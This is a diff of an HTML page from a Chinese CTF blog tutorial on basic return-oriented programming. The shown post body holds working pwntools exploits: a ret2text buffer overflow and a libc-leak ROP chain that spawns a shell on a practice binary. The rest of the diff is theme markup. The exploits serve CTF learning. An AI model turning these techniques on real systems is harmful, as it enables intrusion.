@@ -1,82 +1,202 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="utf-8">
-  
-  
-  
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <title>
-    pwn入门（Basic-ROP） |
     
-    yichen&#39;s blog</title>
-  
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>pwn入门（Basic-ROP） | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="Basic-ROPret2text没啥好说的，看过蒸米的就可以做出来了 exp： 123456from pwn import *p&#x3D;process(&#39;.&#x2F;ret2text&#39;)sys_addr&#x3D;0x804863Apayload&#x3D;&#39;a&#39;*112+p32(sys_addr)p.sendline(payload)p.interactive()  ret2shellcode通过有一个复制的函数，会复制到 b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn入门（Basic-ROP）">
+<meta property="og:url" content="https://yichen115.github.io/2019/11/17/ug9gx5/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="Basic-ROPret2text没啥好说的，看过蒸米的就可以做出来了 exp： 123456from pwn import *p&#x3D;process(&#39;.&#x2F;ret2text&#39;)sys_addr&#x3D;0x804863Apayload&#x3D;&#39;a&#39;*112+p32(sys_addr)p.sendline(payload)p.interactive()  ret2shellcode通过有一个复制的函数，会复制到 b">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162875314-6f04e478-d8ce-4975-b1d7-502907400056.png#align=left&display=inline&height=263&name=image.png&originHeight=262&originWidth=407&size=19937&status=done&style=none&width=409">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162983275-2c3a0d0b-dad5-4f15-a5d8-8e219efa3c7c.png#align=left&display=inline&height=175&name=image.png&originHeight=236&originWidth=708&size=32140&status=done&style=none&width=524">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574163235157-20066c3b-fd85-44dd-afb4-59ec9d47ab72.png#align=left&display=inline&height=228&name=image.png&originHeight=247&originWidth=543&size=48953&status=done&style=none&width=501">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574326114023-1a1a7dd8-3b3b-4b26-b267-8ab853fc7a6e.png#align=left&display=inline&height=75&name=image.png&originHeight=72&originWidth=613&size=19876&status=done&style=none&width=638">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335064586-620aa890-57e1-4427-8846-51990871c55c.png#align=left&display=inline&height=103&name=image.png&originHeight=124&originWidth=684&size=33007&status=done&style=none&width=570">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335389884-7affaef4-c92f-49e7-b6d6-c9ce091d9732.png#align=left&display=inline&height=406&name=image.png&originHeight=499&originWidth=685&size=132214&status=done&style=none&width=558">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335469653-97f966c2-e116-4976-842a-adffcaefd70a.png#align=left&display=inline&height=90&name=image.png&originHeight=91&originWidth=578&size=18744&status=done&style=none&width=574">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574335607223-0e92b707-49c5-4e31-9bbf-fcb7a4764a6e.png#align=left&display=inline&height=132&name=image.png&originHeight=134&originWidth=551&size=21897&status=done&style=none&width=541">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574336747696-914e4724-c8c3-4ba1-b65d-cb3a93459f68.png#align=left&display=inline&height=383&name=image.png&originHeight=440&originWidth=699&size=167103&status=done&style=none&width=608">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574403535178-184d2107-b762-47bd-9dda-d629e74d4483.png#align=left&display=inline&height=305&name=image.png&originHeight=406&originWidth=761&size=112257&status=done&style=none&width=572">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407070973-4b88be2e-6388-4c28-b14e-83ffa84124e0.png#align=left&display=inline&height=200&name=image.png&originHeight=244&originWidth=597&size=30927&status=done&style=none&width=490">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574407137985-b2057cf8-fad6-4a89-80a8-355dc9f41fdc.png#align=left&display=inline&height=124&name=image.png&originHeight=107&originWidth=401&size=15203&status=done&style=none&width=464">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586037138-97e8c208-e876-48ca-b9cd-0a64d829175f.png#align=left&display=inline&height=313&name=image.png&originHeight=393&originWidth=738&size=112691&status=done&style=none&width=587">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574586260374-add330e2-4491-4b46-9980-2f450c34faf6.png#align=left&display=inline&height=127&name=image.png&originHeight=110&originWidth=437&size=28530&status=done&style=none&width=505">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574510177475-db49a7d5-6909-421e-a868-6829c9a7b4a4.png#align=left&display=inline&height=356&name=image.png&originHeight=418&originWidth=730&size=76244&status=done&style=none&width=621">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/jpeg/268938/1574513788142-e66171f3-6300-4e14-ab57-cc301c936829.jpeg#align=left&display=inline&height=485&name=20160611124517413.jpg&originHeight=485&originWidth=1058&size=104297&status=done&style=none&width=1058">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580779496150-487cd998-b4af-4bb0-ad41-9ab376a7f8ff.png#align=left&display=inline&height=242&name=image.png&originHeight=483&originWidth=1368&size=225849&status=done&style=none&width=684">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780401627-53526fc2-3646-4478-b040-8f1fb30ca0dc.png#align=left&display=inline&height=225&name=image.png&originHeight=450&originWidth=1225&size=208147&status=done&style=none&width=612.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780428606-42b2c58b-1809-43dc-8b4e-afa79a1456cf.png#align=left&display=inline&height=240&name=image.png&originHeight=479&originWidth=1242&size=195181&status=done&style=none&width=621">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1580780626820-92e99da4-b8f0-43c7-b9df-1ba09342a0ff.png#align=left&display=inline&height=159&name=image.png&originHeight=175&originWidth=692&size=62711&status=done&style=none&width=627">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739542097-a6d2738b-9a08-4b5f-acd8-d5f2c4d77278.jpeg#align=left&display=inline&height=699&originHeight=699&originWidth=1082&size=0&status=done&style=none&width=1082">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/268938/1580739570228-64997692-8003-4c10-acf2-2c8d91095e3c.jpeg#align=left&display=inline&height=699&originHeight=699&originWidth=1072&size=0&status=done&style=none&width=1072">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668172344-2d5dce6a-3e6a-437a-bcc7-5a06950ee918.png#align=left&display=inline&height=893&name=1566026309029.png&originHeight=893&originWidth=564&size=32499&status=done&style=none&width=564">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574668407609-8e44a3b0-4464-41c1-aad9-e9163a76d1c1.png#align=left&display=inline&height=319&name=image.png&originHeight=274&originWidth=209&size=12875&status=done&style=none&width=243">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663502432-70335a77-3256-4ba8-adf0-f7208c5b7ed7.png#align=left&display=inline&height=125&name=image.png&originHeight=146&originWidth=742&size=47466&status=done&style=none&width=636">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574663904109-6e3aa29a-7ae6-48f4-98f6-7ba99c5cf511.png#align=left&display=inline&height=411&name=image.png&originHeight=311&originWidth=328&size=34307&status=done&style=none&width=433">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574664880977-b87b80fb-e80a-43ad-b6c6-22fad2b1bda8.png#align=left&display=inline&height=95&name=image.png&originHeight=82&originWidth=386&size=14325&status=done&style=none&width=449">
+<meta property="article:published_time" content="2019-11-17T03:20:21.000Z">
+<meta property="article:modified_time" content="2020-07-15T23:44:41.408Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1574162875314-6f04e478-d8ce-4975-b1d7-502907400056.png#align=left&display=inline&height=263&name=image.png&originHeight=262&originWidth=407&size=19937&status=done&style=none&width=409">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
     <link rel="shortcut icon" href="/favicon.ico">
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
 
-  
+    <!-- custom head -->
     
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-  
-  
-<script src="/js/pace.min.js"></script>
-
-<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
-<main class="content">
-  <section class="outer">
-<meta name="referrer" content="no-referrer" />
-  <article id="post-ug9gx5" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+    <div id="loading" class="active"></div>
 
-    <div class="article-inner">
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
         
-            <header class="article-header">
-                
-  
-    <h1 class="article-title" itemprop="name">
-      pwn入门（Basic-ROP）
-    </h1>
-  
-  
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">pwn入门（Basic-ROP）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">pwn入门（Basic-ROP）</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-17T03:20:21.000Z" itemprop="datePublished" class="page-time">
+  2019-11-17
+</time>
 
 
+            
+        </h5>
+    </div>
+
+    
 
 
-            </header>
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Basic-ROP"><span class="post-toc-number">1.</span> <span class="post-toc-text">Basic-ROP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ret2text"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">ret2text</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ret2shellcode"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">ret2shellcode</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sniperoj-pwn100-shellcode-x86-64："><span class="post-toc-number">1.3.</span> <span class="post-toc-text">sniperoj-pwn100-shellcode-x86-64：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ret2syscall"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">ret2syscall</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ret2libc"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">ret2libc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#例-1"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">例 1</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#例-2"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">例 2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#例-3"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">例 3</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#train-cs-nctu-edu-tw：ret2libc"><span class="post-toc-number">1.5.4.</span> <span class="post-toc-text">train.cs.nctu.edu.tw：ret2libc</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Linux-动态链接"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">Linux 动态链接</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PLT-amp-GOT"><span class="post-toc-number">1.6.1.</span> <span class="post-toc-text">PLT&amp;GOT</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#延迟绑定"><span class="post-toc-number">1.6.2.</span> <span class="post-toc-text">延迟绑定</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Practice"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">Practice</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#train-cs-nctu-edu-tw：rop"><span class="post-toc-number">1.7.1.</span> <span class="post-toc-text">train.cs.nctu.edu.tw：rop</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2013-PlaidCTF-ropasaurusrex"><span class="post-toc-number">1.7.2.</span> <span class="post-toc-text">2013-PlaidCTF-ropasaurusrex</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Defcon-2015-Qualifier-R0pbaby"><span class="post-toc-number">1.7.3.</span> <span class="post-toc-text">Defcon 2015 Qualifier: R0pbaby</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ug9gx5"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">pwn入门（Basic-ROP）</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-17 11:20:21" datetime="2019-11-17T03:20:21.000Z"  itemprop="datePublished">2019-11-17</time>
+
             
 
-                
-                    <div class="article-meta">
-                        <a href="/2019/11/17/ug9gx5/" class="article-date">
-  <time datetime="2019-11-17T03:20:21.000Z" itemprop="datePublished">2019-11-17</time>
-</a>
-                            
-                    </div>
-                    
 
-                        
-                            
-    <div class="tocbot"></div>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
 
 
-
-
-
-                                
-
-                                    <div class="article-entry" itemprop="articleBody">
-                                        
-
-
-                                            
-
-                                                
-                                                                    <h1 id="Basic-ROP"><a href="#Basic-ROP" class="headerlink" title="Basic-ROP"></a>Basic-ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>没啥好说的，看过蒸米的就可以做出来了</p>
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Basic-ROP"><a href="#Basic-ROP" class="headerlink" title="Basic-ROP"></a>Basic-ROP</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>没啥好说的，看过蒸米的就可以做出来了</p>
 <p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./ret2text'</span>)</span><br><span class="line">sys_addr=<span class="number">0x804863A</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">112</span>+p32(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -241,177 +361,303 @@
 <p>大佬的 exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">ropbaby = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfuncaddress</span><span class="params">(func)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'symbol: '</span>)</span><br><span class="line">    sh.sendline(func)</span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    addr = sh.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> int(addr, <span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addropbuff</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'): '</span>)</span><br><span class="line">    length = len(payload)</span><br><span class="line">    sh.sendline(str(length))</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">rdi_ret_offset = <span class="number">0x0000000000021102</span></span><br><span class="line">system_addr = getfuncaddress(<span class="string">'system'</span>)</span><br><span class="line">libc = LibcSearcher(<span class="string">'system'</span>, system_addr)</span><br><span class="line">libc_base = system_addr - libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc.dump(<span class="string">'str_bin_sh'</span>) + libc_base</span><br><span class="line">rdi_ret = rdi_ret_offset + libc_base</span><br><span class="line"><span class="keyword">print</span> hex(system_addr), hex(binsh_addr), hex(rdi_ret)</span><br><span class="line">payload = flat([<span class="string">'b'</span> * <span class="number">8</span>, rdi_ret, binsh_addr, system_addr])</span><br><span class="line">addropbuff(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-                                                                        
-                                    </div>
-                                    <footer class="article-footer">
-                                        <a data-url="http://yoursite.com/2019/11/17/ug9gx5/" data-id="ckco0htxz000mh4u943d52ocr" class="article-share-link">
-                                            Share
-                                        </a>
-                                        
-                                    </footer>
-
-    </div>
-
-    
-        
-  <nav class="article-nav">
-    
-      <a href="/2019/11/22/nuwzb3/" class="article-nav-link">
-        <strong class="article-nav-caption">Newer</strong>
-        <div class="article-nav-title">
-          
-            ffmpeg（视频处理）
-          
         </div>
-      </a>
+
+        <blockquote class="post-copyright">
     
-    
-      <a href="/2019/11/16/seedcu/" class="article-nav-link">
-        <strong class="article-nav-caption">Older</strong>
-        <div class="article-nav-title">内存取证</div>
-      </a>
-    
-  </nav>
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2020-07-15T23:44:41.408Z" itemprop="dateUpdated">2020-07-16 07:44:41</time>
+</span><br>
 
 
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2019/11/17/ug9gx5/" target="_blank" rel="external">https://yichen115.github.io/2019/11/17/ug9gx5/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://yichen115.github.io">
+            <img src="/img/avatar.png" alt="yichen">
+            yichen
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
             
 
-                
-                    
-    <div class="vcomments" id="vcomments"></div>
+            
+<div class="page-share-wrap">
     
-<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
 
-        <script>
-            new Valine({
-                el: '#vcomments',
-                appId: '',
-                appKey: '',
-                notify: 'false',
-                verify: 'true',
-                avatar: 'mp',
-                pageSize: '10',
-                placeholder: '请输入...'
-            })
-        </script>
-        
-                        
-                            
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2019/11/17/ug9gx5/&title=《pwn入门（Basic-ROP）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2019/11/17/ug9gx5/&title=《pwn入门（Basic-ROP）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2019/11/17/ug9gx5/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《pwn入门（Basic-ROP）》 — yichen's blog&url=https://yichen115.github.io/2019/11/17/ug9gx5/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2019/11/17/ug9gx5/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/11/22/nuwzb3/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">ffmpeg（视频处理）</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/11/16/seedcu/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">内存取证</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 </article>
-</section>
-  <footer class="footer">
-  <div class="outer">
-    <div class="float-right">
-      <ul class="list-inline">
-  
-    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
-  
-    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
-  
-</ul>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
     </div>
-    <ul class="list-inline">
-      <li>&copy; 2020 yichen&#39;s blog</li>
-      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
-      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
-    </ul>
-  </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>yichen &copy; 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
 </footer>
 
-</main>
-<aside class="sidebar">
-  <button class="navbar-toggle"></button>
-<nav class="navbar">
-  
-    <div class="logo">
-      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
-    </div>
-  
-  <ul class="nav nav-main">
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="/">主页</a>
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://yichen115.github.io/2019/11/17/ug9gx5/&title=《pwn入门（Basic-ROP）》 — yichen's blog&pic=https://yichen115.github.io/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
       </li>
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="/archives">归档</a>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
       </li>
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://yichen115.github.io/2019/11/17/ug9gx5/&title=《pwn入门（Basic-ROP）》 — yichen's blog&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
       </li>
-    
-      <li class="nav-item">
-        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://yichen115.github.io/2019/11/17/ug9gx5/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
       </li>
-    
-    <li class="nav-item">
-      <a class="nav-item-link nav-item-search" title="Search">
-        <i class="fe fe-search"></i>
-        Search
-      </a>
-    </li>
-  </ul>
-</nav>
-<nav class="navbar navbar-bottom">
-  <ul class="nav">
-    <li class="nav-item">
-      <div class="totop" id="totop">
-  <i class="fe fe-rocket"></i>
+      <li>
